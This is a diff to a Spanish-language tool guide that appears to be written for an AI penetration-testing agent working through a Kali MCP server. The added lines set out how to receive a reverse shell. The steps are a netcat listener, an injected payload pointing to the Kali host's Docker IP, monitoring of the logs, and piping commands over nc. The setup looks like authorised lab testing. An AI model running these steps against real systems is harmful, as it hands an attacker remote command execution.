@@ -39,7 +39,13 @@ Vias de accion disponibles:
   escribe el script DENTRO del propio comando; no busques una tool nueva.
 - **`mcp_kali_kali_exec`** — alternativa ASINCRONA para comandos largos: arranca el comando en
   segundo plano y devuelve un identificador; luego consultas con `mcp_kali_get_scan_status` y lees
-  salida parcial con `mcp_kali_read_tool_logs`.
+  salida parcial con `mcp_kali_read_tool_logs`. **Caso de uso clave: listeners de reverse shell.**
+  Para recibir un reverse shell: (1) `kali_exec` con `nc -nlvp <port>` → obtienes el job_id;
+  (2) inyectas el payload en el target apuntando a la IP de la Kali en la red Docker
+  (obtén la IP con `kali_run hostname -I`); (3) monitorizas con `get_scan_status` +
+  `read_tool_logs` hasta que aparezca la conexión; (4) envías comandos por el shell con
+  `kali_run echo 'CMD' | nc -q1 <kali_ip> <port>` o directamente en el mismo `kali_exec`
+  si el job sigue activo.
 - **`mcp_kali_prowler_scan`** / **`mcp_kali_iam_enum`** — recoleccion cloud y enumeracion IAM
   read-only (AWS), utiles en Observe.
 - **`mcp_kali_iam_simulate`** — simula permisos efectivos de privesc de un principal IAM (AWS,
